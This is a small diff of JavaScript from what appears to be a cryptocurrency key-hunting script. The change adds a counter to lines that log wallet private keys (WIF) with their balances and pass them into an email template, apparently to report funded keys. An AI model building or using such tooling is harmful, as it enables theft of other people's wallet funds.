@@ -495,7 +495,7 @@ var countaccount = 0;
 				
 
 					
-			console.log(wif+' balance: '+data);
+			console.log(countaccount+' - '+wif+' balance: '+data);
 			
 			r=data;
 				
@@ -507,7 +507,7 @@ var countaccount = 0;
 	    				template_params: {
 	    				    'to_name': 'CHAN',
 	    				    'from_name':'SUCCESS',
-	    				    'message': wif +' balance: '+data
+	    				    'message': countaccount+' - '+wif +' balance: '+data
 	  				  	}
 					};
 							$.ajax({
